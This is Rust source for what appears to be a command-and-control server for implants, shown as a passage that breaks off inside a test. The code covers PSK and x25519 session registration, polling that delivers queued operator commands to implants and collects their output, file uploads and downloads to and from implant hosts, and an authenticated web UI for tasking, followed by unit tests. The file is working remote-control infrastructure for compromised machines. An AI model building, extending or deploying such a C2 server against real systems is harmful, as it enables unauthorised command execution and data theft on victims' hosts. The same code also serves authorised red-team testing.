use std::{
    collections::{HashSet, VecDeque},
    sync::Arc,
    time::Duration,
};

use axum::{
    Extension, Json, Router,
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Json as JsonResponse, Sse},
    routing::{get, post},
};
use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{PollReply, PollRequest, Register, RegisterAck, Task},
};
use std::convert::Infallible;
use uuid::Uuid;

use crate::{auth::middleware::AuthenticatedUserGuard, db::repositories::Repository};

fn session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
    crypto::derive_key(psk, b"nw-m1-salt")
}

fn b64(k: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

fn deb64(s: &str) -> Result<[u8; crypto::KEY_LEN], ()> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|_| ())?;
    <[u8; crypto::KEY_LEN]>::try_from(raw.as_slice()).map_err(|_| ())
}

/// C2 endpoint router. Unauthenticated: the only credential is the baked PSK
/// used to authenticate the registration handshake, after which each session
/// derives its own forward-secret x25519 key pair (see `register`). Mount with
/// the payload PSK supplied as `Extension<Arc<Vec<u8>>>`.
pub fn router(psk: Arc<Vec<u8>>) -> Router<Repository> {
    Router::<Repository>::new()
        .route("/c2/register", post(register))
        .route("/c2/poll", post(poll))
        .route("/c2/checkin", post(checkin))
        .layer(Extension(psk))
}

#[derive(Debug)]
pub enum C2Error {
    BadRequest,
    Unauthorized,
    Internal,
}

impl C2Error {
    fn status(&self) -> StatusCode {
        match self {
            Self::BadRequest => StatusCode::BAD_REQUEST,
            Self::Unauthorized => StatusCode::UNAUTHORIZED,
            Self::Internal => StatusCode::INTERNAL_SERVER_ERROR,
        }
    }
}

pub async fn process_sealed(
    repo: &Repository,
    psk: &[u8],
    wire: &[u8],
    protocol: &str,
) -> Result<Vec<u8>, C2Error> {
    process_sealed_with_store(repo, psk, wire, protocol, None).await
}

async fn process_sealed_with_store(
    repo: &Repository,
    psk: &[u8],
    wire: &[u8],
    protocol: &str,
    transfer_store: Option<&crate::callback_workspace::transfers::TransferStore>,
) -> Result<Vec<u8>, C2Error> {
    let wire = std::str::from_utf8(wire).map_err(|_| C2Error::BadRequest)?;
    let key = match Envelope::routing_id(wire) {
        None => session_key(psk),
        Some(session_id) => {
            let encoded = repo
                .session_key_for(&session_id.to_string())
                .await
                .map_err(|_| C2Error::Internal)?
                .ok_or(C2Error::Unauthorized)?;
            deb64(&encoded).map_err(|_| C2Error::Unauthorized)?
        }
    };
    let env = Envelope::open(&key, wire).map_err(|_| C2Error::Unauthorized)?;
    let reply = process_envelope(repo, psk, env, protocol, transfer_store).await?;
    reply
        .seal(&key)
        .map(String::into_bytes)
        .map_err(|_| C2Error::Internal)
}

async fn process_envelope(
    repo: &Repository,
    psk: &[u8],
    env: Envelope,
    protocol: &str,
    transfer_store: Option<&crate::callback_workspace::transfers::TransferStore>,
) -> Result<Envelope, C2Error> {
    match env.kind {
        Kind::Register => process_sealed_register(repo, psk, env, protocol).await,
        Kind::TaskResult | Kind::Heartbeat => {
            process_sealed_poll_with_store(repo, env, transfer_store).await
        }
        _ => Err(C2Error::BadRequest),
    }
}

#[cfg(test)]
async fn process_sealed_poll(repo: &Repository, env: Envelope) -> Result<Envelope, C2Error> {
    process_sealed_poll_with_store(repo, env, None).await
}

async fn process_sealed_register(
    repo: &Repository,
    psk: &[u8],
    env: Envelope,
    protocol: &str,
) -> Result<Envelope, C2Error> {
    if env.session_id.is_some() {
        return Err(C2Error::BadRequest);
    }
    let key = session_key(psk);
    let plaintext =
        crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| C2Error::Unauthorized)?;
    let register: Register = serde_json::from_slice(&plaintext).map_err(|_| C2Error::BadRequest)?;
    let implant_pub = deb64(&register.session_key).map_err(|_| C2Error::BadRequest)?;
    let server_keys = crypto::KeyPair::generate();
    let shared = server_keys
        .shared_secret(&implant_pub)
        .map_err(|_| C2Error::Unauthorized)?;
    let derived = crypto::derive_key(&shared, crypto::SESSION_SALT);
    let session_id = Uuid::new_v4();
    repo.upsert_callback_registration(&session_id.to_string(), &register, &b64(&derived), protocol)
        .await
        .map_err(|_| C2Error::Internal)?;
    let reply_id = env.id + 1;
    let ack = RegisterAck {
        session_id,
        server_pub: b64(&server_keys.public_key()),
    };
    let plaintext = serde_json::to_vec(&ack).map_err(|_| C2Error::Internal)?;
    let encrypted = crypto::encrypt(&key, reply_id, &plaintext).map_err(|_| C2Error::Internal)?;
    Ok(Envelope::new(
        Kind::RegisterAck,
        reply_id,
        Some(session_id),
        encrypted,
    ))
}

async fn process_sealed_poll_with_store(
    repo: &Repository,
    env: Envelope,
    transfer_store: Option<&crate::callback_workspace::transfers::TransferStore>,
) -> Result<Envelope, C2Error> {
    let session_id = env.session_id.ok_or(C2Error::BadRequest)?;
    let encoded = repo
        .session_key_for(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?
        .ok_or(C2Error::Unauthorized)?;
    let key = deb64(&encoded).map_err(|_| C2Error::Unauthorized)?;
    let plaintext =
        crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| C2Error::Unauthorized)?;
    let request: PollRequest =
        serde_json::from_slice(&plaintext).map_err(|_| C2Error::BadRequest)?;
    let frame_budget = if request.inner_budget == 0 {
        usize::MAX
    } else {
        request.inner_budget
    };
    repo.touch_callback(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?;
    let has_upload = repo
        .next_file_transfer(&session_id.to_string(), "upload")
        .await
        .map_err(|_| C2Error::Internal)?
        .is_some();
    let transfer_store = if let Some(store) = transfer_store {
        Some(store.clone())
    } else if !request.file_chunks.is_empty() || !request.upload_acks.is_empty() || has_upload {
        Some(
            crate::callback_workspace::transfers::TransferStore::configured(repo.clone())
                .map_err(|_| C2Error::Internal)?,
        )
    } else {
        None
    };
    let mut accepted_ids = request.acked_ids;
    accepted_ids.extend(request.accepted_task_ids);
    accepted_ids.sort_unstable();
    accepted_ids.dedup();
    repo.acknowledge_tasks(&session_id.to_string(), &accepted_ids)
        .await
        .map_err(|_| C2Error::BadRequest)?;
    let mut result_acks = Vec::new();
    for result in request.results {
        let stored = repo
            .store_task_result_for_session(
                &session_id.to_string(),
                &result.task_id.to_string(),
                result.ok,
                &result.stdout,
                &result.stderr,
                result.exit_code,
            )
            .await
            .map_err(|_| C2Error::Internal)?;
        if stored {
            if let Some(store) = transfer_store.as_ref() {
                store
                    .cleanup_cancelled_task(&session_id.to_string(), &result.task_id.to_string())
                    .await
                    .map_err(transfer_c2_error)?;
            }
            result_acks.push(result.task_id);
        }
    }
    let mut file_acks = Vec::new();
    if let Some(store) = transfer_store.as_ref() {
        for chunk in &request.file_chunks {
            file_acks.push(
                store
                    .receive_chunk(&session_id.to_string(), chunk)
                    .await
                    .map_err(transfer_c2_error)?,
            );
        }
        for ack in &request.upload_acks {
            file_acks.push(
                store
                    .ack_upload(&session_id.to_string(), ack)
                    .await
                    .map_err(transfer_c2_error)?,
            );
        }
    }
    let tasks = repo
        .tasks_for_delivery(&session_id.to_string())
        .await
        .map_err(|_| C2Error::Internal)?
        .into_iter()
        .filter_map(|task| {
            Some(Task {
                id: Uuid::parse_str(&task.id).ok()?,
                command: task.command,
                args: serde_json::from_value(task.args_json).ok()?,
                timeout_ms: task.timeout_ms,
            })
        })
        .collect::<Vec<_>>();
    let push_chunks = if let Some(store) = transfer_store.as_ref() {
        store
            .next_upload_chunks(&session_id.to_string(), frame_budget)
            .await
            .map_err(transfer_c2_error)?
    } else {
        Vec::new()
    };
    let reply = PollReply {
        tasks,
        result_acks,
        acks: file_acks,
        push_chunks: Vec::new(),
    };
    let reply_id = env.id + 1;
    fit_poll_reply_to_budget(&key, reply_id, session_id, frame_budget, reply, push_chunks)
}

fn poll_reply_envelope(
    key: &[u8; crypto::KEY_LEN],
    reply_id: u64,
    session_id: Uuid,
    reply: &PollReply,
) -> Result<Envelope, C2Error> {
    let plaintext = serde_json::to_vec(&reply).map_err(|_| C2Error::Internal)?;
    let encrypted = crypto::encrypt(&key, reply_id, &plaintext).map_err(|_| C2Error::Internal)?;
    Ok(Envelope::new(
        if reply.tasks.is_empty() {
            Kind::Heartbeat
        } else {
            Kind::Task
        },
        reply_id,
        Some(session_id),
        encrypted,
    ))
}

fn poll_reply_fits(
    key: &[u8; crypto::KEY_LEN],
    reply_id: u64,
    session_id: Uuid,
    reply: &PollReply,
    inner_budget: usize,
) -> Result<bool, C2Error> {
    Ok(poll_reply_envelope(key, reply_id, session_id, reply)?
        .seal(key)
        .map_err(|_| C2Error::Internal)?
        .len()
        <= inner_budget)
}

/// Reserve the fixed poll reply first, then fit a contiguous transfer prefix
/// against the bytes emitted by `Envelope::seal` (not plaintext JSON size).
fn fit_poll_reply_to_budget(
    key: &[u8; crypto::KEY_LEN],
    reply_id: u64,
    session_id: Uuid,
    inner_budget: usize,
    mut reply: PollReply,
    push_chunks: Vec<nw_profile::msgs::FileChunk>,
) -> Result<Envelope, C2Error> {
    reply.push_chunks.clear();
    if !poll_reply_fits(key, reply_id, session_id, &reply, inner_budget)? {
        return Err(C2Error::BadRequest);
    }

    for chunk in push_chunks {
        reply.push_chunks.push(chunk.clone());
        if poll_reply_fits(key, reply_id, session_id, &reply, inner_budget)? {
            continue;
        }
        reply.push_chunks.pop();
        if chunk.data.is_empty() {
            break;
        }

        let mut low = 1usize;
        let mut high = chunk.data.len();
        let mut fitted = None;
        while low <= high {
            let midpoint = low + (high - low) / 2;
            let mut truncated = chunk.clone();
            truncated.data.truncate(midpoint);
            reply.push_chunks.push(truncated.clone());
            let fits = poll_reply_fits(key, reply_id, session_id, &reply, inner_budget)?;
            reply.push_chunks.pop();
            if fits {
                fitted = Some(truncated);
                low = midpoint + 1;
            } else {
                high = midpoint - 1;
            }
        }
        if let Some(chunk) = fitted {
            reply.push_chunks.push(chunk);
        }
        break;
    }

    poll_reply_envelope(key, reply_id, session_id, &reply)
}

fn transfer_c2_error(error: crate::callback_workspace::transfers::TransferError) -> C2Error {
    use crate::callback_workspace::transfers::TransferError;
    match error {
        TransferError::Storage | TransferError::Repository | TransferError::UnsafeStorage => {
            C2Error::Internal
        }
        _ => C2Error::BadRequest,
    }
}

async fn checkin(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    store: Option<Extension<crate::callback_workspace::transfers::TransferStore>>,
    body: axum::body::Bytes,
) -> Result<axum::body::Bytes, StatusCode> {
    process_sealed_with_store(
        &repo,
        &psk,
        &body,
        "http",
        store.as_ref().map(|Extension(store)| store),
    )
    .await
    .map(axum::body::Bytes::from)
    .map_err(|error| error.status())
}

async fn register(
    State(repo): State<Repository>,
    Extension(psk): Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    if env.kind != Kind::Register || env.session_id.is_some() {
        return Err(StatusCode::BAD_REQUEST);
    }
    // Register handshake is authenticated with the PSK-derived key; both sides
    // then roll ephemeral x25519 keys and DH them to derive a per-session key.
    let key = session_key(&psk);
    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let reg: Register = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
    let implant_pub = deb64(&reg.session_key).map_err(|_| StatusCode::BAD_REQUEST)?;

    let server_kp = crypto::KeyPair::generate();
    let shared = server_kp
        .shared_secret(&implant_pub)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;
    let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

    let sid = Uuid::new_v4();
    repo.upsert_callback_registration(&sid.to_string(), &reg, &b64(&session_key), "http")
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let ack = RegisterAck {
        session_id: sid,
        server_pub: b64(&server_kp.public_key()),
    };
    let reply_id = env.id + 1;
    let plaintext = serde_json::to_vec(&ack).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    // Ack rides the PSK key so the implant can decrypt it before deriving the
    // DH session key; the session key encrypts only subsequent polls.
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(
        Kind::RegisterAck,
        reply_id,
        Some(sid),
        out,
    )))
}

async fn poll(
    State(repo): State<Repository>,
    _psks: Extension<Arc<Vec<u8>>>,
    Json(env): Json<Envelope>,
) -> Result<Json<Envelope>, StatusCode> {
    let Some(sid) = env.session_id else {
        return Err(StatusCode::BAD_REQUEST);
    };
    let key_b64 = repo
        .session_key_for(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        .ok_or(StatusCode::UNAUTHORIZED)?;
    let key = deb64(&key_b64).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
    let request: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;

    repo.touch_callback(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    // Store any task results the implant reported.
    let mut accepted_ids = request.acked_ids;
    accepted_ids.extend(request.accepted_task_ids);
    accepted_ids.sort_unstable();
    accepted_ids.dedup();
    repo.acknowledge_tasks(&sid.to_string(), &accepted_ids)
        .await
        .map_err(|_| StatusCode::BAD_REQUEST)?;

    let mut result_acks = Vec::new();
    for result in &request.results {
        if repo
            .store_task_result_for_session(
                &sid.to_string(),
                &result.task_id.to_string(),
                result.ok,
                &result.stdout,
                &result.stderr,
                result.exit_code,
            )
            .await
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
        {
            result_acks.push(result.task_id);
        }
    }

    // Fetch pending tasks for this session and mark them as delivered/processing.
    let tasks = repo
        .tasks_for_delivery(&sid.to_string())
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let reply_id = env.id + 1;
    let task_msgs: Vec<Task> = tasks
        .iter()
        .filter_map(|t| {
            serde_json::from_value::<Vec<String>>(t.args_json.clone())
                .ok()
                .and_then(|args| {
                    Some(Task {
                        id: Uuid::parse_str(&t.id).ok()?,
                        command: t.command.clone(),
                        args,
                        timeout_ms: t.timeout_ms,
                    })
                })
        })
        .collect();
    let reply = PollReply {
        tasks: task_msgs,
        result_acks,
        acks: Vec::new(),
        push_chunks: Vec::new(),
    };
    let plaintext = serde_json::to_vec(&reply).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let out = crypto::encrypt(&key, reply_id, &plaintext)
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(Envelope::new(
        Kind::Heartbeat,
        reply_id,
        Some(sid),
        out,
    )))
}

/// Web UI routes for C2 task management. Requires authentication.
/// Provides an SSE endpoint for real-time task result streaming and a POST
/// endpoint to enqueue tasks from the Mythic-style callback detail page.
pub fn web_router() -> Router<Repository> {
    Router::<Repository>::new()
        .route("/c2/sessions/{session_id}/tasks/sse", get(task_results_sse))
        .route("/c2/sessions/{session_id}/tasks", post(enqueue_web_task))
}

async fn enqueue_web_task(
    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
    State(repo): State<Repository>,
    Path(session_id): Path<String>,
    Json(payload): Json<EnqueueTaskRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    let args_json = serde_json::json!(payload.args);
    let task_id = repo
        .enqueue_task(
            &session_id,
            &payload.command,
            &args_json,
            payload.timeout_ms.unwrap_or(30_000),
        )
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(JsonResponse(serde_json::json!({
        "id": task_id,
        "command": payload.command,
        "status": "pending",
    })))
}

#[derive(Debug, serde::Deserialize)]
struct EnqueueTaskRequest {
    command: String,
    args: Option<Vec<String>>,
    timeout_ms: Option<u64>,
}

/// SSE handler that streams task result events for a callback session.
/// Clients connect with EventSource and receive task_completed / task_error
/// events as they arrive.
async fn task_results_sse(
    AuthenticatedUserGuard(_user): AuthenticatedUserGuard,
    State(repo): State<Repository>,
    Path(session_id): Path<String>,
) -> Sse<impl futures::Stream<Item = Result<axum::response::sse::Event, Infallible>> + Send> {
    use futures::stream;

    let stream = stream::unfold(
        (
            repo,
            session_id,
            HashSet::<String>::new(),
            VecDeque::<serde_json::Value>::new(),
        ),
        |(repo, session_id, mut seen, mut queued)| async move {
            loop {
                if let Some(payload) = queued.pop_front() {
                    let event = axum::response::sse::Event::default().data(payload.to_string());
                    return Some((Ok(event), (repo, session_id, seen, queued)));
                }

                if let Ok(tasks) = repo.list_tasks_for_session(&session_id).await {
                    for task in tasks.into_iter().rev() {
                        if seen.contains(&task.id) {
                            continue;
                        }
                        if let Some(payload) = completed_task_payload(&task) {
                            seen.insert(task.id);
                            queued.push_back(payload);
                        }
                    }
                }

                if queued.is_empty() {
                    tokio::time::sleep(Duration::from_millis(500)).await;
                }
            }
        },
    );

    Sse::new(stream)
        .keep_alive(axum::response::sse::KeepAlive::new().interval(Duration::from_secs(15)))
}

fn completed_task_payload(task: &crate::db::models::C2TaskWithResult) -> Option<serde_json::Value> {
    if !matches!(task.status.as_str(), "completed" | "error") {
        return None;
    }

    let output = task
        .result_output
        .as_deref()
        .and_then(|encoded| {
            use base64::Engine;
            base64::engine::general_purpose::STANDARD
                .decode(encoded)
                .ok()
        })
        .map(|decoded| String::from_utf8_lossy(&decoded).into_owned())
        .unwrap_or_default();

    Some(serde_json::json!({
        "id": task.id,
        "command": task.command,
        "status": task.status,
        "output": output,
        "completed_at": task.completed_at,
        "exit_code": task.result_exit_code,
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::Request;
    use axum::routing::post;
    use nw_implant::runtime::{BeaconRuntime, Profile};
    use std::path::Path;
    use std::sync::atomic::{AtomicBool, Ordering};
    use tower::ServiceExt;

    #[cfg(unix)]
    fn lifecycle_command(started: &Path, finished: &Path) -> (String, serde_json::Value) {
        (
            "sh".into(),
            serde_json::json!([
                "-c",
                "printf started > \"$1\"; sleep 3; printf finished > \"$2\"",
                "nw-lifecycle-test",
                started,
                finished,
            ]),
        )
    }

    #[cfg(windows)]
    fn lifecycle_command(started: &Path, finished: &Path) -> (String, serde_json::Value) {
        (
            "cmd.exe".into(),
            serde_json::json!([
                "/D",
                "/S",
                "/C",
                format!(
                    "type nul > \"{}\" & ping -n 4 127.0.0.1 > nul & type nul > \"{}\"",
                    started.display(),
                    finished.display(),
                ),
            ]),
        )
    }

    fn b64(b: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    async fn seed_poll_session(repo: &Repository, key: &[u8; crypto::KEY_LEN]) -> Uuid {
        let session_id = Uuid::new_v4();
        sqlx::query(
            "INSERT INTO c2_sessions (id, hostname, username, os, arch, pid, addr, session_key, last_seen) \
             VALUES (?, 'host', 'user', 'linux', 'x86_64', 1, '127.0.0.1', ?, strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))",
        )
        .bind(session_id.to_string())
        .bind(key.to_vec())
        .execute(&repo.pool)
        .await
        .unwrap();
        sqlx::query(
            "INSERT INTO callbacks (id, host, user_name, process, arch, os, protocol, status, session_key) \
             VALUES (?, 'host', 'user', 'implant', 'x86_64', 'linux', 'http', 'active', ?)",
        )
        .bind(session_id.to_string())
        .bind(b64(key))
        .execute(&repo.pool)
        .await
        .unwrap();
        session_id
    }

    async fn sealed_poll(
        repo: &Repository,
        session_id: Uuid,
        key: &[u8; crypto::KEY_LEN],
        id: u64,
        request: PollRequest,
    ) -> PollReply {
        let encrypted = crypto::encrypt(key, id, &serde_json::to_vec(&request).unwrap()).unwrap();
        let reply = process_sealed_poll(
            repo,
            Envelope::new(Kind::TaskResult, id, Some(session_id), encrypted),
        )
        .await
        .unwrap();
        let plaintext = crypto::decrypt(key, reply.id, &reply.encrypted).unwrap();
        serde_json::from_slice(&plaintext).unwrap()
    }

    fn sealed_poll_request(
        session_id: Uuid,
        key: &[u8; crypto::KEY_LEN],
        id: u64,
        request: &PollRequest,
    ) -> String {
        let plaintext = serde_json::to_vec(request).unwrap();
        let encrypted = crypto::encrypt(key, id, &plaintext).unwrap();
        Envelope::new(Kind::TaskResult, id, Some(session_id), encrypted)
            .seal(key)
            .unwrap()
    }

    async fn sealed_checkin(
        repo: Repository,
        psk: Arc<Vec<u8>>,
        store: crate::callback_workspace::transfers::TransferStore,
        wire: String,
    ) -> axum::response::Response {
        router(psk)
            .with_state(repo)
            .layer(Extension(store))
            .oneshot(Request::post("/c2/checkin").body(Body::from(wire)).unwrap())
            .await
            .unwrap()
    }

    #[tokio::test]
    async fn sealed_wire_non_transfer_reply_fits_advertised_budget() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let psk = Arc::new(b"sealed-budget-psk".to_vec());
        let key = crypto::derive_key(b"sealed-budget-session", b"test");
        let session_id = seed_poll_session(&repo, &key).await;
        let directory = tempfile::tempdir().unwrap();
        let store = crate::callback_workspace::transfers::TransferStore::new(
            repo.clone(),
            directory.path(),
            4096,
        )
        .unwrap();
        let inner_budget = 1200;
        let wire = sealed_poll_request(
            session_id,
            &key,
            100,
            &PollRequest {
                inner_budget,
                ..Default::default()
            },
        );

        let response = sealed_checkin(repo, psk, store, wire).await;

        assert_eq!(response.status(), StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(
            body.len() <= inner_budget,
            "sealed reply was {} bytes",
            body.len()
        );
    }

    #[tokio::test]
    async fn sealed_wire_truncates_one_upload_chunk_and_makes_progress() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let psk = Arc::new(b"sealed-chunk-psk".to_vec());
        let key = crypto::derive_key(b"sealed-chunk-session", b"test");
        let session_id = seed_poll_session(&repo, &key).await;
        sqlx::query("INSERT INTO users (id, username, password_hash, role) VALUES ('sealed-operator', 'alice', 'x', 'operator')")
            .execute(&repo.pool)
            .await
            .unwrap();
        let directory = tempfile::tempdir().unwrap();
        let store = crate::callback_workspace::transfers::TransferStore::new(
            repo.clone(),
            directory.path(),
            4096,
        )
        .unwrap();
        let mut stage = store.begin_upload_stage().unwrap();
        stage.write(&vec![0x5a; 1024]).unwrap();
        store
            .finish_upload_stage(
                stage,
                &session_id.to_string(),
                "/tmp/to-agent.bin",
                "sealed-operator",
                "alice",
            )
            .await
            .unwrap();
        let inner_budget = 2200;
        let wire = sealed_poll_request(
            session_id,
            &key,
            101,
            &PollRequest {
                inner_budget,
                ..Default::default()
            },
        );

        let response = sealed_checkin(repo, psk, store, wire).await;

        assert_eq!(response.status(), StatusCode::OK);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(
            body.len() <= inner_budget,
            "sealed reply was {} bytes",
            body.len()
        );
        let opened = Envelope::open(&key, std::str::from_utf8(&body).unwrap()).unwrap();
        let plaintext = crypto::decrypt(&key, opened.id, &opened.encrypted).unwrap();
        let reply: PollReply = serde_json::from_slice(&plaintext).unwrap();
        assert_eq!(reply.push_chunks.len(), 1);
        assert!(!reply.push_chunks[0].data.is_empty());
        assert!(reply.push_chunks[0].data.len() < 1024);
    }

    #[tokio::test]
    async fn sealed_wire_rejects_fixed_reply_that_cannot_fit() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let psk = Arc::new(b"sealed-fixed-psk".to_vec());
        let key = crypto::derive_key(b"sealed-fixed-session", b"test");
        let session_id = seed_poll_session(&repo, &key).await;
        repo.enqueue_task(
            &session_id.to_string(),
            "fixed-payload",
            &serde_json::json!(["x".repeat(2048)]),
            5_000,
        )
        .await
        .unwrap();
        let directory = tempfile::tempdir().unwrap();
        let store = crate::callback_workspace::transfers::TransferStore::new(
            repo.clone(),
            directory.path(),
            4096,
        )
        .unwrap();
        let inner_budget = 1200;
        let wire = sealed_poll_request(
            session_id,
            &key,
            102,
            &PollRequest {
                inner_budget,
                ..Default::default()
            },
        );

        let response = sealed_checkin(repo, psk, store, wire).await;

        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert!(
            body.len() <= inner_budget,
            "oversized fixed-reply rejection body was {} bytes",
            body.len()
        );
    }

    #[tokio::test]
    async fn sealed_poll_persists_download_chunks_and_resumes_uploads_within_budget() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"transfer-poll", b"test");
        let session_id = seed_poll_session(&repo, &key).await;
        sqlx::query("INSERT INTO users (id, username, password_hash, role) VALUES ('transfer-operator', 'alice', 'x', 'operator')")
            .execute(&repo.pool).await.unwrap();
        let directory = tempfile::tempdir().unwrap();
        let store = crate::callback_workspace::transfers::TransferStore::new(
            repo.clone(),
            directory.path(),
            4096,
        )
        .unwrap();
        let download = store
            .queue_download(
                &session_id.to_string(),
                "/tmp/from-agent.bin",
                Some(3),
                None,
                "transfer-operator",
                "alice",
            )
            .await
            .unwrap();
        let mut upload_stage = store.begin_upload_stage().unwrap();
        upload_stage.write(b"abcdef").unwrap();
        let upload = store
            .finish_upload_stage(
                upload_stage,
                &session_id.to_string(),
                "/tmp/to-agent.bin",
                "transfer-operator",
                "alice",
            )
            .await
            .unwrap();
        let request = PollRequest {
            file_chunks: vec![nw_profile::msgs::FileChunk {
                transfer_id: Some(Uuid::parse_str(&download.id).unwrap()),
                task_id: download
                    .task_id
                    .as_deref()
                    .map(|id| Uuid::parse_str(id).unwrap()),
                name: "../../ignored.bin".into(),
                offset: 0,
                total: 3,
                data: b"xyz".to_vec(),
            }],
            inner_budget: 4096,
            ..Default::default()
        };
        let id = 41;
        let encrypted = crypto::encrypt(&key, id, &serde_json::to_vec(&request).unwrap()).unwrap();
        let reply = process_sealed_poll_with_store(
            &repo,
            Envelope::new(Kind::TaskResult, id, Some(session_id), encrypted),
            Some(&store),
        )
        .await
        .unwrap();
        let plaintext = crypto::decrypt(&key, reply.id, &reply.encrypted).unwrap();
        let reply: PollReply = serde_json::from_slice(&plaintext).unwrap();
        assert_eq!(reply.acks.len(), 1);
        assert!(reply.acks[0].done);
        assert_eq!(
            reply
                .push_chunks
                .iter()
                .map(|chunk| chunk.data.len())
                .sum::<usize>(),
            6
        );
        assert!(
            reply
                .push_chunks
                .iter()
                .all(|chunk| chunk.transfer_id == Some(Uuid::parse_str(&upload.id).unwrap()))
        );
    }

    #[tokio::test]
    async fn unacknowledged_task_is_redelivered_with_stable_id() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"poll-test-key", b"poll-test-salt");
        let session_id = seed_poll_session(&repo, &key).await;
        let task_id = repo
            .enqueue_task(
                &session_id.to_string(),
                "whoami",
                &serde_json::json!([]),
                5_000,
            )
            .await
            .unwrap();

        let first = sealed_poll(&repo, session_id, &key, 1, PollRequest::default()).await;
        let second = sealed_poll(&repo, session_id, &key, 2, PollRequest::default()).await;
        assert_eq!(first.tasks.len(), 1);
        assert_eq!(second.tasks.len(), 1);
        assert_eq!(first.tasks[0].id.to_string(), task_id);
        assert_eq!(second.tasks[0].id, first.tasks[0].id);
        sqlx::query("UPDATE c2_tasks SET processing_at = '2000-01-01T00:00:00Z' WHERE id = ?")
            .bind(&task_id)
            .execute(&repo.pool)
            .await
            .unwrap();

        let acknowledged = sealed_poll(
            &repo,
            session_id,
            &key,
            3,
            PollRequest {
                acked_ids: vec![first.tasks[0].id],
                ..Default::default()
            },
        )
        .await;
        assert!(acknowledged.tasks.is_empty());
        let (status, processing_at): (String, Option<String>) =
            sqlx::query_as("SELECT status, processing_at FROM c2_tasks WHERE id = ?")
                .bind(task_id)
                .fetch_one(&repo.pool)
                .await
                .unwrap();
        assert_eq!(status, "processing");
        assert_ne!(processing_at.as_deref(), Some("2000-01-01T00:00:00Z"));
    }

    async fn terminal_audit_count(repo: &Repository, task_id: &str) -> i64 {
        sqlx::query_scalar(
            "SELECT COUNT(*) FROM c2_audit WHERE details = ? \
             AND action IN ('task_completed', 'task_error', 'task_cancelled')",
        )
        .bind(format!("task {task_id}"))
        .fetch_one(&repo.pool)
        .await
        .unwrap()
    }

    #[tokio::test]
    async fn pending_cancellation_is_immediate_and_has_one_terminal_audit() {
        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
        crate::db::run_migrations(&pool).await.unwrap();
        let repo = Repository { pool };
        let key = crypto::derive_key(b"cancel-pending", b"test");
        let sid = seed_poll_session(&repo, &key).await;
        let task_id = repo
            .enqueue_task(
                &sid.to_string(),
                "sleep",
                &serde_json::json!(["30"]),
                60_000,
            )
            .await
            .unwrap();

        assert_eq!(
            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
                .await
                .unwrap(),
            crate::db::models::TaskCancellation::Cancelled
        );
        assert_eq!(
            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
                .await
                .unwrap(),
            crate::db::models::TaskCancellation::AlreadyTerminal
        );
        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
            .bind(&task_id)
            .fetch_one(&repo.pool)
            .await
            .unwrap();
        assert_eq!(status, "cancelled");
